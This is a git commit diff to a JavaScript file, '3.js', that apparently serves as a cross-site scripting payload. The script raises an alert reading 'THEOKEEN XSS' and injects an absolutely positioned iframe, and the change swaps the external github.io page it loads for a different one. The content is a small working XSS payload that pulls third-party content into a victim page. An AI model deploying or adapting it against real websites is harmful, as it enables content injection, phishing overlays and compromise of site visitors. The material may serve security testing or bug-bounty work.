51e4ba3e18b424673d6a7733614f4b4872d6ce78
Slyfer <67638136+iLSlyfer@users.noreply.github.com>
2025-04-26 17:06:52 -0300

    Update 3.js

--- 3.js
+++ 3.js
@@ -2,7 +2,7 @@
 var iframe = document.createElement('iframe');
 alert("THEOKEEN XSS")
 // Configurar el iframe
-iframe.src = 'https://snowflakelabs.github.io/_s7d6_scene7_com/index.html'; // URL del iframe
+iframe.src = 'https://ilslyfer.github.io/_s7d6_scene7_com/index.html'; // URL del iframe
 iframe.width = '800'; // Ancho del iframe
 iframe.height = '600'; // Altura del iframe
 iframe.style.position = 'absolute';
